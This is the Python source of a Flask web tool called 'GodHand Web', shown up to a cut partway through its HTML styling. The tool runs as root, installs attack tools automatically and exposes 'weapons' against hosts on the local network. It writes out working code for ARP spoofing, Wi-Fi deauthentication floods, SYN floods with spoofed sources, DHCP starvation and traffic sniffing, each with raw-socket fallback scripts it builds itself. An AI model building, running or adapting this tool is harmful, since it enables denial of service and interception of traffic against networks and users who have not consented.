#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GodHand Web – Production‑ready network control centre
Baby‑friendly UI, robust attack engine with tool fallbacks, and action verification.
Run as root.
"""

import os
import sys
import subprocess
import time
import json
import re
import threading
import socket
import struct
import fcntl
import random
import select
import ipaddress
import tempfile
import hashlib
from flask import Flask, request, jsonify, render_template_string

# ---------- configuration ----------
SECRET = os.environ.get('GODHAND_SECRET', '')  # if set, require this token

# ---------- global state ----------
STATE = {
    'interface': None,
    'gateway': None,
    'port': 80,
    'targets': [],
    'hosts': [],
    'attack_pids': {},          # weapon_id -> list of Popen objects
    'attack_status': {},        # weapon_id -> 'running' or 'dead' (updated on poll)
    'blocked_macs': set(),
    'monitor_log': [],          # latest lines from monitor attack
    'monitor_log_path': None,
    'log': [],                  # server-side activity log: list of dicts {time, level, msg}
    'status': 'Ready'
}

app = Flask(__name__)

# ---------- server-side logging ----------
def add_log(level, msg):
    """Append to server log, keep last 200 entries."""
    entry = {
        'time': time.strftime('%H:%M:%S'),
        'level': level,
        'msg': msg
    }
    STATE['log'].append(entry)
    STATE['log'] = STATE['log'][-200:]
    print(f"[{level.upper()}] {msg}")

# ---------- tool auto‑installer ----------
_INSTALLED_TOOLS = set()
_INSTALL_ATTEMPTED = set()

def detect_package_manager():
    """Return the package manager command and install flag."""
    if os.path.exists('/data/data/com.termux'):
        return ('pkg', 'install', '-y')
    if subprocess.call(['which', 'apt-get'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('apt-get', 'install', '-y')
    if subprocess.call(['which', 'pacman'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('pacman', '-S', '--noconfirm')
    if subprocess.call(['which', 'dnf'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('dnf', 'install', '-y')
    if subprocess.call(['which', 'brew'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('brew', 'install')
    return None

def install_package(pkg_name):
    if pkg_name in _INSTALL_ATTEMPTED:
        return pkg_name in _INSTALLED_TOOLS
    _INSTALL_ATTEMPTED.add(pkg_name)
    pm = detect_package_manager()
    if pm is None:
        add_log('error', f'No package manager found; cannot install {pkg_name}')
        return False
    cmd = list(pm) + [pkg_name]
    try:
        add_log('info', f'Installing {pkg_name} ...')
        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _INSTALLED_TOOLS.add(pkg_name)
        return True
    except:
        add_log('error', f'Failed to install {pkg_name}')
        return False

def ensure_tool(tool_name, package_name=None):
    if tool_exists(tool_name):
        return True
    if package_name is None:
        package_name = tool_name
    pkg_map = {
        'arpspoof': 'dsniff',
        'aireplay-ng': 'aircrack-ng',
        'mdk4': 'mdk4',
        'hping3': 'hping3',
        'dhcpig': 'dhcpig',
        'iw': 'iw',
        'iptables': 'iptables',
    }
    pkg = pkg_map.get(package_name, package_name)
    installed = install_package(pkg)
    return installed and tool_exists(tool_name)

def tool_exists(name):
    return subprocess.call(['which', name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

# ---------- network helpers ----------
def get_my_ip_and_cidr(iface):
    try:
        out = subprocess.check_output(['ip', '-o', '-4', 'addr', 'show', iface], text=True)
        for line in out.splitlines():
            if 'inet ' in line:
                parts = line.split()
                ip_cidr = parts[3]
                return ip_cidr.split('/')
    except:
        pass
    return ('0.0.0.0', '24')

def get_mac(iface):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface[:15].encode()))
        s.close()
        return info[18:24].hex(':')
    except:
        return '00:00:00:00:00:00'

def arp_scan(iface, my_ip, cidr):
    results = []
    net = ipaddress.IPv4Network(f'{my_ip}/{cidr}', strict=False)
    src_mac = bytes.fromhex(get_mac(iface).replace(':', ''))

    def arp_packet(src_mac, src_ip, dst_ip):
        eth = b'\xff' * 6 + src_mac + struct.pack('!H', 0x0806)
        arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, 1)
        arp += src_mac + socket.inet_aton(src_ip)
        arp += b'\x00' * 6 + socket.inet_aton(dst_ip)
        return eth + arp

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    sock.bind((iface, 0))
    sock.setblocking(0)

    hosts = [str(h) for h in net.hosts()]
    for ip in hosts:
        try:
            sock.send(arp_packet(src_mac, my_ip, ip))
        except:
            pass

    deadline = time.time() + 4
    seen = {}
    while time.time() < deadline:
        r, _, _ = select.select([sock], [], [], 0.1)
        if r:
            data, _ = sock.recvfrom(65535)
            if len(data) >= 42 and struct.unpack('!H', data[12:14])[0] == 0x0806:
                if struct.unpack('!H', data[20:22])[0] == 2:
                    sip = socket.inet_ntoa(data[28:32])
                    smac = data[22:28]
                    if sip != my_ip and smac != b'\x00' * 6:
                        mac = smac.hex(':')
                        if sip not in seen:
                            seen[sip] = mac
                            results.append({'ip': sip, 'mac': mac})
    sock.close()
    return results

def get_gateway_mac(iface, gateway_ip):
    """Try to get gateway MAC via ARP scan or system cache."""
    # Try ip neigh
    try:
        out = subprocess.check_output(['ip', 'neigh', 'show', gateway_ip], text=True)
        m = re.search(r'(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', out)
        if m:
            return m.group(1)
    except:
        pass
    # Fallback: ARP scan a few times
    my_ip, cidr = get_my_ip_and_cidr(iface)
    hosts = arp_scan(iface, my_ip, cidr)
    for h in hosts:
        if h['ip'] == gateway_ip:
            return h['mac']
    return None

def server_ping(ip, timeout=1):
    """Ping an IP and return True if reachable."""
    try:
        subprocess.check_output(['ping', '-c', '1', '-W', str(timeout), ip],
                                stderr=subprocess.DEVNULL, timeout=timeout+1)
        return True
    except:
        return False

def server_tcp_connect(ip, port, timeout=1):
    """Try TCP connect to a port."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except:
        return False

# ---------- monitor mode helper (with error checking) ----------
def set_monitor(iface, enable=True, raise_on_fail=False):
    mode = 'monitor' if enable else 'managed'
    try:
        subprocess.run(['iw', 'dev', iface, 'set', 'type', mode],
                       check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        if enable:
            time.sleep(0.5)
            out = subprocess.check_output(['iw', 'dev', iface, 'info'], text=True)
            if 'type monitor' not in out:
                raise RuntimeError(f'Failed to set monitor mode on {iface}')
        return True
    except subprocess.CalledProcessError as e:
        if raise_on_fail:
            raise RuntimeError(f'Monitor mode change failed: {e.stderr.decode()}')
        return False
    except Exception as e:
        if raise_on_fail:
            raise
        return False

# ---------- checksum helpers ----------
def ip_checksum(data):
    if len(data) % 2 == 1:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def tcp_checksum(ip_src, ip_dst, tcp_segment):
    psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\x00' + struct.pack('!B', 6) + struct.pack('!H', len(tcp_segment))
    checksum_data = psh + tcp_segment
    if len(checksum_data) % 2 == 1:
        checksum_data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def udp_checksum(ip_src, ip_dst, udp_segment):
    psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\x00' + struct.pack('!B', 17) + struct.pack('!H', len(udp_segment))
    checksum_data = psh + udp_segment
    if len(checksum_data) % 2 == 1:
        checksum_data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# ---------- attack launchers (each returns list of Popen or raises) ----------
def start_attack_arp_freeze(targets, gateway, iface):
    add_log('info', f'Starting ARP Freeze on {iface} for {len(targets)} targets')
    pids = []
    if ensure_tool('arpspoof', 'dsniff'):
        for t in targets:
            cmd = ['arpspoof', '-i', iface, '-t', t, gateway]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            # Give it a moment to start
            time.sleep(0.1)
            if proc.poll() is not None:
                raise RuntimeError(f'arpspoof failed for target {t}')
            pids.append(proc)
        for t in targets:
            cmd = ['arpspoof', '-i', iface, '-t', gateway, t]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                raise RuntimeError(f'arpspoof failed for gateway {gateway}')
            pids.append(proc)
        return pids
    else:
        # Python fallback – uses a valid fake MAC (our own MAC) to increase success
        fake_mac = get_mac(iface).replace(':', '')
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(f"""
import socket, struct, time
IFACE = '{iface}'
GATEWAY = '{gateway}'
TARGETS = {targets}
FAKE = bytes.fromhex('{fake_mac}')
def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
    try:
        eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
        arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
        arp += src_mac + socket.inet_aton(src_ip)
        arp += dst_mac + socket.inet_aton(dst_ip)
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        s.bind((IFACE, 0))
        s.send(eth + arp)
        s.close()
    except Exception as e:
        print(e, file=sys.stderr)
while True:
    for t in TARGETS:
        send_arp(2, GATEWAY, t, FAKE, b'\\xff'*6)
        send_arp(2, t, GATEWAY, FAKE, b'\\xff'*6)
    time.sleep(0.5)
""")
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('ARP fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_deauth(targets, iface):
    add_log('info', f'Starting Deauth Flood on {iface} for {len(targets)} targets')
    # We need monitor mode
    if not set_monitor(iface, True, raise_on_fail=True):
        raise RuntimeError('Failed to enable monitor mode')
    pids = []
    gateway_mac = get_gateway_mac(iface, STATE['gateway']) if STATE['gateway'] else None

    if ensure_tool('aireplay-ng', 'aircrack-ng'):
        # Use aireplay-ng per target if possible
        if targets and gateway_mac:
            for t_ip in targets:
                # We need target MAC – try to find in hosts
                t_mac = None
                for h in STATE['hosts']:
                    if h['ip'] == t_ip:
                        t_mac = h['mac']
                        break
                if t_mac:
                    cmd = ['aireplay-ng', '-0', '0', '-a', gateway_mac, '-c', t_mac, iface]
                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
                    time.sleep(0.1)
                    if proc.poll() is not None:
                        continue
                    pids.append(proc)
        if not pids:
            # Fallback to broadcast deauth
            cmd = ['aireplay-ng', '-0', '0', '-a', 'FF:FF:FF:FF:FF:FF', iface]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                raise RuntimeError('aireplay-ng broadcast deauth failed')
            pids.append(proc)
        return pids
    elif ensure_tool('mdk4'):
        cmd = ['mdk4', iface, 'd', '-c', '100']
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        time.sleep(0.1)
        if proc.poll() is not None:
            raise RuntimeError('mdk4 deauth failed')
        pids.append(proc)
        return pids
    else:
        # Python fallback – basic broadcast deauth
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(f"""
import socket, struct, time
IFACE = '{iface}'
radiotap = b'\\x00\\x00\\x0e\\x00\\x04\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
def deauth_packet(dst, bssid, seq):
    frame_control = b'\\xc0\\x00'
    duration = b'\\x00\\x00'
    seq_control = struct.pack('<H', seq & 0xfff)
    reason = struct.pack('<H', 7)
    frame = frame_control + duration + dst + bssid + bssid + seq_control + reason
    return radiotap + frame
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
sock.bind((IFACE, 0))
seq = 0
bssid = b'\\xff'*6
while True:
    sock.send(deauth_packet(b'\\xff'*6, bssid, seq))
    seq = (seq + 1) & 0xfff
    time.sleep(0.1)
""")
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('Deauth fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_syn_flood(targets, port, iface):
    add_log('info', f'Starting SYN Flood on {iface}:{port} for {len(targets)} targets')
    pids = []
    if ensure_tool('hping3'):
        for t in targets:
            cmd = ['hping3', '-S', '-p', str(port), '--flood', '--rand-source', t]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                continue
            pids.append(proc)
        if not pids:
            raise RuntimeError('No hping3 processes started')
        return pids
    else:
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(f"""
import socket, struct, random, time, sys
TARGETS = {targets}
PORT = {port}
def tcp_checksum(ip_src, ip_dst, tcp_segment):
    psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\\x00' + struct.pack('!B', 6) + struct.pack('!H', len(tcp_segment))
    checksum_data = psh + tcp_segment
    if len(checksum_data) % 2 == 1:
        checksum_data += b'\\x00'
    s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
while True:
    for t in TARGETS:
        try:
            src_ip = '.'.join(str(random.randint(1,254)) for _ in range(4))
            iph = b'\\x45\\x00\\x00\\x28' + struct.pack('!H', random.randint(0,65535)) + b'\\x40\\x00\\x40\\x06\\x00\\x00'
            iph += socket.inet_aton(src_ip) + socket.inet_aton(t)
            tcp = struct.pack('!HHIIBBHHH', random.randint(1024,65535), PORT, 0,0, 0x50,0x02, 5840,0,0)
            tcp = tcp[:16] + struct.pack('!H', tcp_checksum(src_ip, t, tcp)) + tcp[18:]
            pkt = iph + tcp
            s.sendto(pkt, (t,0))
        except Exception as e:
            pass
    time.sleep(0.01)
""")
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('SYN flood fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_dhcp_storm(targets, gateway, iface):
    add_log('info', f'Starting DHCP Storm on {iface} targeting DHCP server {gateway}')
    pids = []
    if ensure_tool('dhcpig'):
        cmd = ['dhcpig', '-i', iface, '-t', gateway, '-s', '1000']
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        time.sleep(0.1)
        if proc.poll() is not None:
            raise RuntimeError('dhcpig failed to start')
        pids.append(proc)
        return pids
    else:
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(f"""
import socket, struct, random, time
IFACE = '{iface}'
GATEWAY = '{gateway}'
our_mac = bytes.fromhex('{get_mac(iface).replace(':','')}')
BROADCAST = '255.255.255.255'
def udp_checksum(ip_src, ip_dst, udp_segment):
    psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\\x00' + struct.pack('!B', 17) + struct.pack('!H', len(udp_segment))
    checksum_data = psh + udp_segment
    if len(checksum_data) % 2 == 1:
        checksum_data += b'\\x00'
    s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
while True:
    src_ip = '.'.join(str(random.randint(1,254)) for _ in range(4))
    iph = b'\\x45\\x00\\x01\\x10' + struct.pack('!H', random.randint(0,65535)) + b'\\x00\\x00\\x40\\x11\\x00\\x00'
    iph += socket.inet_aton(src_ip) + socket.inet_aton(BROADCAST)
    udp = struct.pack('!HHH', 68, 67, 0x0100)
    udp = udp + b'\\x00\\x00'
    dhcp = b'\\x01\\x01\\x06\\x00'
    dhcp += struct.pack('!I', random.randint(0, 2**32 - 1))
    dhcp += b'\\x00\\x00\\x00\\x00'
    dhcp += socket.inet_aton('0.0.0.0') * 4
    dhcp += our_mac + b'\\x00' * 10
    dhcp += b'\\x00' * 192
    dhcp += b'\\x63\\x82\\x53\\x63'
    dhcp += struct.pack('BB', 53, 1) + b'\\x01'
    dhcp += struct.pack('BB', 61, 7) + b'\\x01' + our_mac
    dhcp += b'\\xff'
    dhcp += b'\\x00' * (256 - len(dhcp))
    udp = udp[:4] + struct.pack('!H', udp_checksum(src_ip, BROADCAST, udp + dhcp)) + udp[6:]
    pkt = iph + udp + dhcp
    s.sendto(pkt, (BROADCAST, 67))
    time.sleep(0.2)
""")
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('DHCP storm fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_monitor(targets, port, iface):
    add_log('info', f'Starting Traffic Capture on {iface} for port {port}')
    # Enable monitor mode for best capture
    if not set_monitor(iface, True, raise_on_fail=False):
        add_log('warn', 'Monitor mode could not be enabled; capture may be incomplete')
    fd, path = tempfile.mkstemp(suffix='.py')
    os.close(fd)
    log_path = f"/tmp/godhand_monitor_{int(time.time())}.log"
    with open(path, 'w') as f:
        f.write(f"""
import socket, struct, select, time, sys
IFACE = '{iface}'
TARGETS = {targets}
PORT = {port}
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
sock.bind((IFACE,0))
while True:
    r,_,_ = select.select([sock],[],[],0.5)
    if r:
        data = sock.recvfrom(65535)[0]
        if len(data)<14: continue
        if struct.unpack('!H',data[12:14])[0] != 0x0800: continue
        if len(data)<34: continue
        src_ip = socket.inet_ntoa(data[26:30]); dst_ip = socket.inet_ntoa(data[30:34])
        proto = data[23]
        if proto == 6 and len(data)>=54:
            sp,dp = struct.unpack('!HH',data[34:38])
            if sp==PORT or dp==PORT:
                if src_ip in TARGETS: print(f"{src_ip} -> {dst_ip}:{dp}")
                elif dst_ip in TARGETS: print(f"{dst_ip} <- {src_ip}:{sp}")
        elif proto == 17 and len(data)>=42:
            sp,dp = struct.unpack('!HH',data[34:38])
            if sp==PORT or dp==PORT:
                if src_ip in TARGETS: print(f"{src_ip} -> {dst_ip}:{dp}")
                elif dst_ip in TARGETS: print(f"{dst_ip} <- {src_ip}:{sp}")
        sys.stdout.flush()
""")
    log_file = open(log_path, 'w')
    proc = subprocess.Popen(['python3', path], stdout=log_file, stderr=subprocess.PIPE)
    time.sleep(0.5)
    if proc.poll() is not None:
        raise RuntimeError('Monitor script exited immediately')
    STATE['monitor_log_path'] = log_path
    threading.Thread(target=lambda: (proc.wait(), log_file.close(), os.unlink(path)), daemon=True).start()
    def update_monitor_log():
        last_pos = 0
        while proc.poll() is None:
            try:
                with open(log_path, 'r') as lf:
                    lf.seek(last_pos)
                    new_lines = lf.readlines()
                    last_pos = lf.tell()
                    if new_lines:
                        STATE['monitor_log'] = (STATE['monitor_log'] + new_lines)[-100:]
            except:
                pass
            time.sleep(0.5)
    threading.Thread(target=update_monitor_log, daemon=True).start()
    return [proc]

def run_attack(weapon_id, targets, gateway, port, iface):
    if not targets:
        raise ValueError('No targets')
    if weapon_id == 1:
        return start_attack_arp_freeze(targets, gateway, iface)
    elif weapon_id == 2:
        return start_attack_deauth(targets, iface)
    elif weapon_id == 3:
        return start_attack_syn_flood(targets, port, iface)
    elif weapon_id == 4:
        return start_attack_dhcp_storm(targets, gateway, iface)
    elif weapon_id == 5:
        return start_attack_monitor(targets, port, iface)
    return None

def kill_attack(pids):
    for proc in pids:
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except:
            try:
                proc.kill()
            except:
                pass

# ---------- kick & block (with verification) ----------
def kick_client(ip, mac, iface):
    add_log('info', f'Attempting to kick {ip} ({mac})')
    if not set_monitor(iface, True, raise_on_fail=True):
        raise RuntimeError('Cannot enable monitor mode')
    if ensure_tool('aireplay-ng', 'aircrack-ng'):
        cmd = ['aireplay-ng', '-0', '5', '-a', 'FF:FF:FF:FF:FF:FF', '-c', mac, iface]
        res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if res.returncode != 0:
            raise RuntimeError('aireplay-ng deauth failed: ' + res.stderr.decode())
    else:
        # Python fallback
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(f"""
import socket, struct, time
IFACE = '{iface}'
MAC = '{mac}'
dst_mac = bytes.fromhex(MAC.replace(':', ''))
radiotap = b'\\x00\\x00\\x0e\\x00\\x04\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
def pkt(dst, seq):
    frame_control = b'\\xc0\\x00'
    duration = b'\\x00\\x00'
    seq_control = struct.pack('<H', seq & 0xfff)
    reason = struct.pack('<H', 7)
    bssid = b'\\xff'*6
    frame = frame_control + duration + dst + bssid + bssid + seq_control + reason
    return radiotap + frame
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
sock.bind((IFACE, 0))
for i in range(20):
    sock.send(pkt(dst_mac, i))
    sock.send(pkt(b'\\xff'*6, i))
    time.sleep(0.05)
sock.close()
""")
        res = subprocess.run(['python3', path], stderr=subprocess.PIPE)
        os.unlink(path)
        if res.returncode != 0:
            raise RuntimeError('Deauth fallback script failed')
    set_monitor(iface, False)
    # Verification: after a short delay, ping the target
    time.sleep(2)
    reachable = server_ping(ip, timeout=1)
    if reachable:
        add_log('warn', f'Target {ip} is still responding to ping after kick')
        return False  # not fully kicked
    else:
        add_log('success', f'Target {ip} is not responding to ping after kick')
        return True

def block_mac(mac):
    if not mac:
        raise ValueError('No MAC')
    add_log('info', f'Toggling block for MAC {mac}')
    if mac in STATE['blocked_macs']:
        # Try to remove
        r1 = subprocess.run(['iptables', '-D', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                            stderr=subprocess.PIPE)
        r2 = subprocess.run(['iptables', '-D', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                            stderr=subprocess.PIPE)
        # Verify removal
        check = subprocess.run(['iptables', '-C', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                               stderr=subprocess.PIPE)
        if check.returncode == 0:
            # Still exists, removal failed
            raise RuntimeError('Failed to remove iptables rule')
        STATE['blocked_macs'].discard(mac)
        add_log('success', f'Unblocked {mac}')
        return False  # now unblocked
    else:
        r1 = subprocess.run(['iptables', '-I', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                            stderr=subprocess.PIPE)
        r2 = subprocess.run(['iptables', '-I', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                            stderr=subprocess.PIPE)
        # Verify insertion
        check = subprocess.run(['iptables', '-C', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                               stderr=subprocess.PIPE)
        if check.returncode != 0:
            # Rule not found
            raise RuntimeError('Failed to insert iptables rule')
        STATE['blocked_macs'].add(mac)
        add_log('success', f'Blocked {mac}')
        return True

# ---------- Flask routes ----------
@app.route('/')
def index():
    # Updated HTML template with improvements
    html_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🧸 GodHand Web</title>
<style>
  :root {
    --bg: #0b0f14;
    --panel: #121822;
    --panel-2: #0e141d;
    --border: #223047;
    --text: #dbe4f0;
    --dim: #7c8ba1;
    --accent: #38bdf8;
    --good: #34d399;
    --warn: #fbbf24;
    --bad: #f87171;
    --mono: 'SF Mono', 'Consolas', 'Menlo', monospace;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    background: var(--bg);
    color: var(--text);
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    min-height: 100vh;
  }
  header {
    padding: 20px 24px 14px;
    border-bottom: 1px solid var(--border);
  }
  header h1 {
    margin: 0;
    font-size: 20px;
    letter-spacing: 0.02em;
    display: flex;
    align-items: center;
    gap: 10px;
  }
  header h1 .dot {
    width: 9px; height: 9px; border-radius: 50%;
    background: var(--good);
    box-shadow: 0 0 8px var(--good);
  }
  header p {
    margin: 6px 0 0;
    color: var(--dim);
    font-size: 13px;
  }
  .banner {
    background: var(--warn);
    color: #000;
    padding: 8px 16px;
    margin: 0 24px 10px;
    border-radius: 6px;
    font-size: 13px;
    display: none;
  }
  .banner a { color: #000; font-weight: bold; }
  nav {
    display: flex;
    flex-wrap: wrap;
    gap: 4px;
    padding: 10px 24px 0;
    border-bottom: 1px solid var(--border);
  }
  nav button {
    background: none;
    border: none;
    color: var(--dim);
    padding: 10px 16px;
    font-size: 14px;
    cursor: pointer;
    border-bottom: 2px solid transparent;
    font-family: inherit;
  }
  nav button.active {
    color: var(--accent);
    border-bottom-color: var(--accent);
  }
  main {
    padding: 24px;
    max-width: 1100px;
    margin: 0 auto;
  }
  .tab { display: none; }
  .tab.active { display: block; }
  .panel {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 18px;
    margin-bottom: 18px;
  }
  .panel h2 {
    margin: 0 0 4px;
    font-size: 15px;
    color: var(--text);
  }
  .panel .sub {
    color: var(--dim);
    font-size: 12.5px;
    margin: 0 0 14px;
  }
  .row {
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
    margin-bottom: 10px;
    align-items: center;
  }
  input, select, textarea {
    background: var(--panel-2);
    border: 1px solid var(--border);
    color: var(--text);
    border-radius: 6px;
    padding: 9px 11px;
    font-size: 13.5px;
    font-family: inherit;
  }
  input[type=text] { flex: 1; min-width: 140px; }
  textarea {
    width: 100%;
    min-height: 80px;
    font-family: var(--mono);
    font-size: 12.5px;
    resize: vertical;
  }
  button.btn {
    background: var(--accent);
    color: #04121c;
    border: none;
    border-radius: 6px;
    padding: 9px 16px;
    font-size: 13.5px;
    font-weight: 600;
    cursor: pointer;
    font-family: inherit;
  }
  button.btn.secondary {
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text);
  }
  button.btn:hover { opacity: 0.9; }
  button.btn.big {
    font-size: 18px;
    padding: 14px 28px;
    border-radius: 12px;
  }
  button.btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
  table {
    width: 100%;
    border-collapse: collapse;
    font-size: 13px;
  }
  th {
    text-align: left;
    color: var(--dim);
    font-weight: 500;
    font-size: 11.5px;
    text-transform: uppercase;
    letter-spacing: 0.04em;
    padding: 8px 10px;
    border-bottom: 1px solid var(--border);
  }
  td {
    padding: 9px 10px;
    border-bottom: 1px solid var(--border);
    font-family: var(--mono);
  }
  tr:last-child td { border-bottom: none; }
  .badge {
    display: inline-block;
    padding: 2px 8px;
    border-radius: 20px;
    font-size: 11px;
    font-family: -apple-system, sans-serif;
    font-weight: 600;
  }
  .badge.good { background: rgba(52,211,153,0.15); color: var(--good); }
  .badge.warn { background: rgba(251,191,36,0.15); color: var(--warn); }
  .badge.bad { background: rgba(248,113,113,0.15); color: var(--bad); }
  .badge.dim { background: rgba(124,139,161,0.15); color: var(--dim); }
  .empty {
    color: var(--dim);
    font-size: 13px;
    padding: 20px 0;
    text-align: center;
  }
  .icon-btn {
    background: none;
    border: none;
    color: var(--dim);
    cursor: pointer;
    font-size: 15px;
    padding: 2px 6px;
  }
  .icon-btn:hover { color: var(--bad); }
  .alert-item {
    border-left: 3px solid var(--bad);
    background: rgba(248,113,113,0.06);
    padding: 10px 14px;
    border-radius: 4px;
    margin-bottom: 8px;
    font-size: 13px;
  }
  .alert-item .t {
    font-size: 11px;
    color: var(--dim);
    margin-top: 3px;
    font-family: var(--mono);
  }
  .alert-item.warn { border-left-color: var(--warn); background: rgba(251,191,36,0.06); }
  .help {
    font-size: 12px;
    color: var(--dim);
    line-height: 1.5;
    margin-top: 4px;
  }
  code {
    background: var(--panel-2);
    padding: 1px 5px;
    border-radius: 4px;
    font-size: 12px;
    color: var(--accent);
  }
  .weapon-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
    gap: 10px;
    margin: 10px 0;
  }
  .weapon-btn {
    background: var(--panel-2);
    border: 2px solid var(--border);
    border-radius: 10px;
    padding: 14px 8px;
    text-align: center;
    cursor: pointer;
    color: var(--text);
    font-weight: 600;
    transition: 0.2s;
  }
  .weapon-btn.active {
    border-color: var(--accent);
    background: rgba(56,189,248,0.15);
  }
  .weapon-btn:hover { border-color: var(--accent); }
  .weapon-btn .num {
    font-size: 24px;
    display: block;
    color: var(--accent);
  }
  .status-msg {
    background: var(--panel-2);
    border-radius: 6px;
    padding: 10px 14px;
    font-size: 13px;
    border-left: 3px solid var(--accent);
    margin: 10px 0;
  }
  .btn-group {
    display: flex;
